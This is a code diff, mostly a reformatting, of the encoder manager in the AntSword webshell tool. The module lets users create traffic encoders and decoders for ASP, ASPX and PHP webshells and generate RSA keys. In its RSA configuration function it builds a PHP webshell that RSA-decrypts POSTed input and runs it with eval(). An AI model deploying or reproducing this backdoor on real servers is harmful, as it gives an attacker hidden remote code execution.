@@ -28,42 +28,100 @@ class Encoders {
       }
     }
 
-    sidebar.addItem({
-      id: 'encoders',
-      text: `<i class="fa fa-file-code-o"></i> ${LANG['title']}`
-    });
+    sidebar.addItem({id: 'encoders', text: `<i class="fa fa-file-code-o"></i> ${LANG['title']}`});
 
     that.cell = sidebar.cells('encoders');
-    const toolbar = that.cell.attachToolbar();
+    const toolbar = that
+      .cell
+      .attachToolbar();
 
     toolbar.loadStruct([
       {
-        type: 'buttonSelect', text: LANG['toolbar']['new'], icon: 'plus-circle', id: 'new', openAll: true,
+        type: 'buttonSelect',
+        text: LANG['toolbar']['new'],
+        icon: 'plus-circle',
+        id: 'new',
+        openAll: true,
         options: [
-          { id: 'new_asp', icon: 'file-code-o', type: 'button', text: "ASP" },
-          { id: 'new_aspx', icon: 'file-code-o', type: 'button', text: "ASPX" },
-          { id: 'new_php', icon: 'file-code-o', type: 'button', text: "PHP" },
-          { type: 'separator' },
-          { id: 'new_custom', icon: 'file-code-o', type: 'button', text: "Custom" },
-          { type: 'separator' },
-          { id: 'new_php_rsa', icon: 'file-code-o', type: 'button', text: "PHP RSA" }
+          {
+            id: 'new_asp',
+            icon: 'file-code-o',
+            type: 'button',
+            text: "ASP"
+          }, {
+            id: 'new_aspx',
+            icon: 'file-code-o',
+            type: 'button',
+            text: "ASPX"
+          }, {
+            id: 'new_php',
+            icon: 'file-code-o',
+            type: 'button',
+            text: "PHP"
+          }, {
+            type: 'separator'
+          }, {
+            id: 'new_custom',
+            icon: 'file-code-o',
+            type: 'button',
+            text: "Custom"
+          }, {
+            type: 'separator'
+          }, {
+            id: 'new_php_rsa',
+            icon: 'file-code-o',
+            type: 'button',
+            text: "PHP RSA"
+          }
         ]
-      },
-      {
-        type: 'buttonSelect', text: LANG['toolbar']['new_decoder'], icon: 'plus-circle', id: 'new_decoder', openAll: true,
+      }, {
+        type: 'buttonSelect',
+        text: LANG['toolbar']['new_decoder'],
+        icon: 'plus-circle',
+        id: 'new_decoder',
+        openAll: true,
         options: [
-          { id: 'new_php_decoder', icon: 'file-code-o', type: 'button', text: "PHP" },
-          { type: 'separator' },
-          { id: 'new_custom_decoder', icon: 'file-code-o', type: 'button', text: "Custom" },
+          {
+            id: 'new_php_decoder',
+            icon: 'file-code-o',
+            type: 'button',
+            text: "PHP"
+          }, {
+            type: 'separator'
+          }, {
+            id: 'new_custom_decoder',
+            icon: 'file-code-o',
+            type: 'button',
+            text: "Custom"
+          }
         ]
-      },
-      { type: 'separator' },
-      { type: 'button', text: LANG['toolbar']['edit'], icon: 'fa fa-edit', id: 'edit' },
-      { type: 'button', text: LANG['toolbar']['delete'], icon: 'fa fa-trash-o', id: 'delete' },
-      { type: 'separator' },
-      { type: 'button', text: LANG['toolbar']['rsa'], icon: 'fa fa-key', id: 'rsa' },
-      { type: 'separator' },
-      { type: 'button', text: LANG['toolbar']['more'], icon: 'fa fa-chrome', id: 'more' },
+      }, {
+        type: 'separator'
+      }, {
+        type: 'button',
+        text: LANG['toolbar']['edit'],
+        icon: 'fa fa-edit',
+        id: 'edit'
+      }, {
+        type: 'button',
+        text: LANG['toolbar']['delete'],
+        icon: 'fa fa-trash-o',
+        id: 'delete'
+      }, {
+        type: 'separator'
+      }, {
+        type: 'button',
+        text: LANG['toolbar']['rsa'],
+        icon: 'fa fa-key',
+        id: 'rsa'
+      }, {
+        type: 'separator'
+      }, {
+        type: 'button',
+        text: LANG['toolbar']['more'],
+        icon: 'fa fa-chrome',
+        id: 'more'
+      }
     ]);
 
     toolbar.attachEvent("onClick", (id) => {
@@ -97,12 +155,16 @@ class Encoders {
           that.rsaConfig();
           break;
         case "more":
-          antSword.shell.openExternal("https://github.com/AntSwordProject/AwesomeEncoder");
+          antSword
+            .shell
+            .openExternal("https://github.com/AntSwordProject/AwesomeEncoder");
           break;
       }
     });
 
-    let grid = that.cell.attachGrid();
+    let grid = that
+      .cell
+      .attachGrid();
     grid.setHeader(`
       &nbsp;,
       ${LANG['grid']['ename']},
@@ -125,7 +187,9 @@ class Encoders {
       if (stage === 2) {
         nValue = nValue.toLocaleLowerCase();
         oValue = oValue.toLocaleLowerCase();
-        if (nValue === oValue) { return; }
+        if (nValue === oValue) {
+          return;
+        }
         var oename = grid.getRowAttribute(rId, "ename");
         var oepath = grid.getRowAttribute(rId, "epath");
         var oetype = grid.getRowAttribute(rId, "etype");
@@ -155,7 +219,7 @@ class Encoders {
               toastr.error(LANG['message']['ename_duplicate'], LANG_T['error']);
               return;
             }
-            if(oedtype === "decoder" && nValue != "php" && nValue != "custom") {
+            if (oedtype === "decoder" && nValue != "php" && nValue != "custom") {
               toastr.error("Not Support", LANG_T["error"]);
               return;
             }
@@ -175,15 +239,19 @@ class Encoders {
   }
 
   // 创建新的编码器
-  createEncoder(id, edtype="encoder") {
+  createEncoder(id, edtype = "encoder") {
     let self = this;
     let idArr = id.split('_');
     let type = idArr[1];
-    let rsa = idArr.length >= 3 ? (idArr[2] === 'rsa' ? '_rsa':'') : '';
+    let rsa = idArr.length >= 3
+      ? (idArr[2] === 'rsa'
+        ? '_rsa'
+        : '')
+      : '';
 
     layer.prompt({
       value: `my${edtype}`,
-      title: `<i class="fa fa-file-code-o"></i> `+ LANG["prompt"][`create_${edtype}`]
+      title: `<i class="fa fa-file-code-o"></i> ` + LANG["prompt"][`create_${edtype}`]
     }, (value, i, e) => {
       value = value.toLocaleLowerCase();
       if (!value.match(/^[a-zA-Z0-9_]+$/)) {
@@ -199,29 +267,35 @@ class Encoders {
 
       let filedata = '';
       if (edtype === 'encoder') {
-        if(rsa) {
+        if (rsa) {
           filedata = self.default_rsa_template;
-        }else{
+        } else {
           filedata = self.default_template;
         }
-      }else{
+      } else {
         filedata = self.default_decoder_template;
       }
       fs.writeFileSync(savePath, filedata);
 
-      var ids = self.grid.getAllRowIds();
+      var ids = self
+        .grid
+        .getAllRowIds();
       let _id = 1;
       if (ids.length > 0) {
         _id = parseInt(ids[ids.length - 1]);
       }
       _id++;
-      self.grid.addRow(_id, `${_id},${antSword.noxss(value)},${type},${edtype}`);
+      self
+        .grid
+        .addRow(_id, `${_id},${antSword.noxss(value)},${type},${edtype}`);
       toastr.success(LANG["message"]["create_success"], LANG_T["success"]);
-      self.cell.progressOff();
+      self
+        .cell
+        .progressOff();
       layer.close(i);
-      if(edtype === 'encoder') {
+      if (edtype === 'encoder') {
         self.syncencoders();
-      }else{
+      } else {
         self.syncdecoders();
       }
     });
@@ -231,7 +305,9 @@ class Encoders {
   editEncoder() {
     let self = this;
     // 获取选中ID列表
-    let ids = self.grid.getSelectedId();
+    let ids = self
+      .grid
+      .getSelectedId();
     if (!ids) {
       toastr.warning(LANG["message"]["edit_not_select"], LANG_T["warning"]);
       return
@@ -242,29 +318,53 @@ class Encoders {
       return
     }
     let _id = _ids[0];
-    const ename = self.grid.getRowAttribute(_id, 'ename');
-    const epath = self.grid.getRowAttribute(_id, 'epath');
-    const edtype = self.grid.getRowAttribute(_id, 'edtype');
+    const ename = self
+      .grid
+      .getRowAttribute(_id, 'ename');
+    const epath = self
+      .grid
+      .getRowAttribute(_id, 'epath');
+    const edtype = self
+      .grid
+      .getRowAttribute(_id, 'edtype');
     let buff = fs.readFileSync(epath + ".js");
     let opt = {
       title: `${LANG["edit_win_title"]}${LANG[edtype]}: ${ename}`,
       width: 800,
-      height: 600,
+      height: 600
     };
     let _win = new WIN(opt);
-    _win.win.centerOnScreen();
-    _win.win.button('minmax').show();
-    _win.win.button('minmax').enable();
+    _win
+      .win
+      .centerOnScreen();
+    _win
+      .win
+      .button('minmax')
+      .show();
+    _win
+      .win
+      .button('minmax')
+      .enable();
     // _win.win.maximize();
-    let toolbar = _win.win.attachToolbar();
+    let toolbar = _win
+      .win
+      .attachToolbar();
     toolbar.loadStruct([
-      { id: 'save', type: 'button', icon: 'save', text: LANG["toolbar"]['save'] },
-      { type: 'separator' },
+      {
+        id: 'save',
+        type: 'button',
+        icon: 'save',
+        text: LANG["toolbar"]['save']
+      }, {
+        type: 'separator'
+      }
     ]);
     toolbar.attachEvent('onClick', (id) => {
       if (id === 'save') {
         // 保存代码
-        let saveData = editor.session.getValue();
+        let saveData = editor
+          .session
+          .getValue();
         if (!saveData) {
           toastr.warning(LANG["message"]["edit_null_value"], LANG_T["warning"]);
           return
@@ -278,45 +378,51 @@ class Encoders {
     let editor = ace.edit(_win.win.cell.lastChild);
     editor.$blockScrolling = Infinity;
     editor.setTheme('ace/theme/tomorrow');
-    editor.session.setMode(`ace/mode/javascript`);
-    editor.session.setUseWrapMode(true);
-    editor.session.setWrapLimitRange(null, null);
-    editor.setOptions({
-      tabSize: 2,
-      fontSize: '14px',
-      enableBasicAutocompletion: true,
-      enableSnippets: true,
-      enableLiveAutocompletion: true
-    });
+    editor
+      .session
+      .setMode(`ace/mode/javascript`);
+    editor
+      .session
+      .setUseWrapMode(true);
+    editor
+      .session
+      .setWrapLimitRange(null, null);
+    editor.setOptions({tabSize: 2, fontSize: '14px', enableBasicAutocompletion: true, enableSnippets: true, enableLiveAutocompletion: true});
     // 编辑器快捷键
-    editor.commands.addCommand({
-      name: 'save',
-      bindKey: {
-        win: 'Ctrl-S',
-        mac: 'Command-S'
-      },
-      exec: () => {
-        toolbar.callEvent('onClick', ['save']);
-      }
-    });
+    editor
+      .commands
+      .addCommand({
+        name: 'save',
+        bindKey: {
+          win: 'Ctrl-S',
+          mac: 'Command-S'
+        },
+        exec: () => {
+          toolbar.callEvent('onClick', ['save']);
+        }
+      });
 
-    editor.session.setValue(buff.toString());
+    editor
+      .session
+      .setValue(buff.toString());
     // 定时刷新
     const inter = setInterval(editor.resize.bind(editor), 200);
-    _win.win.attachEvent('onClose', () => {
-      if(edtype === 'encoder') {
-        self.syncencoders();
-      }else{
-        self.syncdecoders();
-      }
-      clearInterval(inter);
-      return true;
-    });
+    _win
+      .win
+      .attachEvent('onClose', () => {
+        if (edtype === 'encoder') {
+          self.syncencoders();
+        } else {
+          self.syncdecoders();
+        }
+        clearInterval(inter);
+        return true;
+      });
   }
 
   // 生成 RSA
   generateRsaKey(bit = 1024) {
-    const key = new NodeRSA({ b: bit });
+    const key = new NodeRSA({b: bit});
     let pubKey = key.exportKey('pkcs8-public-pem');
     let priKey = key.exportKey('pkcs1-private-pem');
     let keyPath = this.rsa.keyPath;
@@ -336,11 +442,24 @@ class Encoders {
   // 重新读取 RSA
   reloadRsa() {
     let keyPath = this.rsa.keyPath;
-    let pubKey = fs.existsSync(keyPath.pub) ? fs.readFileSync(keyPath.pub) : '';
-    let priKey = fs.existsSync(keyPath.pri) ? fs.readFileSync(keyPath.pri) : '';
-    this.rsa.form.setItemValue('public_key', pubKey);
-    this.rsa.form.setItemValue('private_key', priKey);
-    this.rsa.form.setItemValue('php_code', `<?php
+    let pubKey = fs.existsSync(keyPath.pub)
+      ? fs.readFileSync(keyPath.pub)
+      : '';
+    let priKey = fs.existsSync(keyPath.pri)
+      ? fs.readFileSync(keyPath.pri)
+      : '';
+    this
+      .rsa
+      .form
+      .setItemValue('public_key', pubKey);
+    this
+      .rsa
+      .form
+      .setItemValue('private_key', priKey);
+    this
+      .rsa
+      .form
+      .setItemValue('php_code', `<?php
 $cmd = @$_POST['ant'];
 $pk = <<<EOF
 ${pubKey}
@@ -349,9 +468,9 @@ $cmds = explode("|", $cmd);
 $pk = openssl_pkey_get_public($pk);
 $cmd = '';
 foreach ($cmds as $value) {
-	if (openssl_public_decrypt(base64_decode($value), $de, $pk)) {
-		$cmd .= $de;
-	}
+  if (openssl_public_decrypt(base64_decode($value), $de, $pk)) {
+    $cmd .= $de;
+  }
 }
 eval($cmd);`);
   }
@@ -362,28 +481,38 @@ eval($cmd);`);
     let opt = {
       title: LANG["rsa_config_win_title"],
       width: 800,
-      height: 600,
+      height: 600
     };
     let _win = new WIN(opt);
-    _win.win.centerOnScreen();
-    let toolbar = _win.win.attachToolbar();
-    let form = _win.win.attachForm();
+    _win
+      .win
+      .centerOnScreen();
+    let toolbar = _win
+      .win
+      .attachToolbar();
+    let form = _win
+      .win
+      .attachForm();
     self.rsa.form = form;
     toolbar.loadStruct([
-      { id: 'generate', type: 'button', icon: 'repeat', text: LANG["toolbar"]['generate'] },
+      {
+        id: 'generate',
+        type: 'button',
+        icon: 'repeat',
+        text: LANG["toolbar"]['generate']
+      }
     ]);
     toolbar.attachEvent('onClick', (id) => {
       if (id === 'generate') {
         if (fs.existsSync(self.rsa.keyPath.pub) && fs.existsSync(self.rsa.keyPath.pri)) {
-          layer.confirm(`${LANG['confirm']['generate']} `,
-            {
-              icon: 2,
-              shift: 6,
-              title: `${LANG['confirm']["generate"]} `,
-            }, (_) => {
-              layer.close(_);
-              self.generateRsaKey();
-            });
+          layer.confirm(`${LANG['confirm']['generate']} `, {
+            icon: 2,
+            shift: 6,
+            title: `${LANG['confirm']["generate"]} `
+          }, (_) => {
+            layer.close(_);
+            self.generateRsaKey();
+          });
         } else {
           self.generateRsaKey();
         }
@@ -397,58 +526,65 @@ eval($cmd);`);
         position: "label-top",
         labelLeft: 25,
         inputLeft: 25
-      },
-      {
+      }, {
         type: 'block',
         inputWidth: 'auto',
         offsetTop: 20,
-        list: [{
-          type: 'input',
-          label: LANG['form']['public_key'],
-          name: 'public_key',
-          rows: 6,
-          value: ''
-        }, {
-          type: 'input',
-          label: LANG['form']['private_key'],
-          name: 'private_key',
-          rows: 15,
-          value: ''
-        }, {
-          type: 'input',
-          label: LANG['form']['php_code'],
-          name: 'php_code',
-          rows: 20,
-          value: ''
-        }]
-      }], true);
+        list: [
+          {
+            type: 'input',
+            label: LANG['form']['public_key'],
+            name: 'public_key',
+            rows: 6,
+            value: ''
+          }, {
+            type: 'input',
+            label: LANG['form']['private_key'],
+            name: 'private_key',
+            rows: 15,
+            value: ''
+          }, {
+            type: 'input',
+            label: LANG['form']['php_code'],
+            name: 'php_code',
+            rows: 20,
+            value: ''
+          }
+        ]
+      }
+    ], true);
     self.reloadRsa();
   }
 
   deleteEncoder() {
     let self = this;
     // 获取选中ID列表
-    let ids = self.grid.getSelectedId();
+    let ids = self
+      .grid
+      .getSelectedId();
     if (!ids) {
       toastr.warning(LANG["message"]["delete_not_select"], LANG_T["warning"]);
       return
     }
     let _ids = ids.split(",");
-    layer.confirm(`${LANG['confirm']['delete'](_ids.length == 1 ? self.grid.getRowAttribute(_ids[0], "ename") : _ids.length)} `,
-      {
-        icon: 2,
-        shift: 6,
-        title: `${LANG["delete_title"]} `,
-      }, (_) => {
-        layer.close(_);
-        _ids.map((_id) => {
-          var epath = self.grid.getRowAttribute(_id, 'epath');
-          fs.unlinkSync(epath + ".js");
-        });
-        toastr.success(LANG["message"]["delete_success"], LANG_T["success"]);
-        self.syncencoders();
-        self.syncdecoders();
+    layer.confirm(`${LANG['confirm']['delete'](_ids.length == 1
+      ? self.grid.getRowAttribute(_ids[0], "ename")
+      : _ids.length)} `, {
+      icon: 2,
+      shift: 6,
+      title: `${LANG["delete_title"]} `
+    }, (_) => {
+      layer.close(_);
+      _ids.map((_id) => {
+        var epath = self
+          .grid
+          .getRowAttribute(_id, 'epath');
+        fs.unlinkSync(epath + ".js");
       });
+      toastr.success(LANG["message"]["delete_success"], LANG_T["success"]);
+      self.syncencoders();
+      self.syncdecoders();
+    });
   }
 
   get default_template() {
@@ -553,62 +689,88 @@ module.exports = {
     let self = this;
     let _id = 1;
 
-    Object.keys(self.encoders).map((t) => {
-      self.encoders[t].map(_ => {
-        data.push({
-          id: _id,
-          ename: _,
-          epath: path.join(remote.process.env.AS_WORKDIR, `antData/encoders/${t}/encoder/${_}`),
-          etype: t, // shell Type
-          edtype: 'encoder',
-          data: [
-            `<i class="fa fa-file-code-o"></i>`,
-            antSword.noxss(_),
-            t,
-            LANG['grid']['edtype']['encoder']
-          ]
-        });
-        _id++;
+    Object
+      .keys(self.encoders)
+      .map((t) => {
+        self
+          .encoders[t]
+          .map(_ => {
+            data.push({
+              id: _id,
+              ename: _,
+              epath: path.join(remote.process.env.AS_WORKDIR, `antData/encoders/${t}/encoder/${_}`),
+              etype: t, // shell Type
+              edtype: 'encoder',
+              data: [
+                `<i class="fa fa-file-code-o"></i>`, antSword.noxss(_),
+                t,
+                LANG['grid']['edtype']['encoder']
+              ]
+            });
+            _id++;
+          });
       });
-    });
 
-    Object.keys(self.decoders).map((t) => {
-      self.decoders[t].map(_ => {
-        data.push({
-          id: _id,
-          ename: _,
-          epath: path.join(remote.process.env.AS_WORKDIR, `antData/encoders/${t}/decoder/${_}`),
-          etype: t, // shell Type
-          edtype: 'decoder',
-          data: [
-            `<i class="fa fa-file-code-o"></i>`,
-            antSword.noxss(_),
-            t,
-            `<span style="color:green;">${LANG['grid']['edtype']['decoder']}</span>`
-          ]
-        });
-        _id++;
+    Object
+      .keys(self.decoders)
+      .map((t) => {
+        self
+          .decoders[t]
+          .map(_ => {
+            data.push({
+              id: _id,
+              ename: _,
+              epath: path.join(remote.process.env.AS_WORKDIR, `antData/encoders/${t}/decoder/${_}`),
+              etype: t, // shell Type
+              edtype: 'decoder',
+              data: [
+                `<i class="fa fa-file-code-o"></i>`, antSword.noxss(_),
+                t,
+                `<span style="color:green;">${LANG['grid']['edtype']['decoder']}</span>`
+              ]
+            });
+            _id++;
+          });
       });
-    });
 
-    self.grid.clearAll();
-    self.grid.parse({
-      'rows': data
-    }, 'json');
+    self
+      .grid
+      .clearAll();
+    self
+      .grid
+      .parse({
+        'rows': data
+      }, 'json');
   }
 
   // 同步到全局编码器
   syncencoders() {
     antSword['encoders'] = (function () {
-      var encoders = { asp: [], aspx: [], php: [], custom: [] };
-      var encoders_path = { asp: [], aspx: [], php: [], custom: [] };
+      var encoders = {
+        asp: [],
+        aspx: [],
+        php: [],
+        custom: []
+      };
+      var encoders_path = {
+        asp: [],
+        aspx: [],
+        php: [],
+        custom: []
+      };
       let userencoder_path = path.join(remote.process.env.AS_WORKDIR, 'antData/encoders');
       // 初始化
-      !fs.existsSync(userencoder_path) ? fs.mkdirSync(userencoder_path) : null;
+      !fs.existsSync(userencoder_path)
+        ? fs.mkdirSync(userencoder_path)
+        : null;
       ['asp', 'aspx', 'php', 'custom'].map((t) => {
-        !fs.existsSync(path.join(userencoder_path, `${t}`)) ? fs.mkdirSync(path.join(userencoder_path, `${t}`)) : null;
+        !fs.existsSync(path.join(userencoder_path, `${t}`))
+          ? fs.mkdirSync(path.join(userencoder_path, `${t}`))
+          : null;
         let t_path = path.join(userencoder_path, `${t}/encoder/`);
-        !fs.existsSync(t_path) ? fs.mkdirSync(t_path) : null;
+        !fs.existsSync(t_path)
+          ? fs.mkdirSync(t_path)
+          : null;
 
         let es = fs.readdirSync(t_path);
         if (es) {
@@ -631,15 +793,31 @@ module.exports = {
   // 同步到全局编码器
   syncdecoders() {
     antSword['decoders'] = (function () {
-      var decoders = { asp: [], aspx: [], php: [], custom: [] };
-      var decoders_path = { asp: [], aspx: [], php: [], custom: [] };
+      var decoders = {
+        asp: [],
+        aspx: [],
+        php: [],
+        custom: []
+      };
+      var decoders_path = {
+        asp: [],
+        aspx: [],
+        php: [],
+        custom: []
+      };
       let userdecoder_path = path.join(remote.process.env.AS_WORKDIR, 'antData/encoders');
       // 初始化
-      !fs.existsSync(userdecoder_path) ? fs.mkdirSync(userdecoder_path) : null;
+      !fs.existsSync(userdecoder_path)
+        ? fs.mkdirSync(userdecoder_path)
+        : null;
       ['asp', 'aspx', 'php', 'custom'].map((t) => {
-        !fs.existsSync(path.join(userdecoder_path, `${t}`)) ? fs.mkdirSync(path.join(userdecoder_path, `${t}`)) : null;
+        !fs.existsSync(path.join(userdecoder_path, `${t}`))
+          ? fs.mkdirSync(path.join(userdecoder_path, `${t}`))
+          : null;
         let t_path = path.join(userdecoder_path, `${t}/decoder/`);
-        !fs.existsSync(t_path) ? fs.mkdirSync(t_path) : null;
+        !fs.existsSync(t_path)
+          ? fs.mkdirSync(t_path)
+          : null;
 
         let es = fs.readdirSync(t_path);
         if (es) {
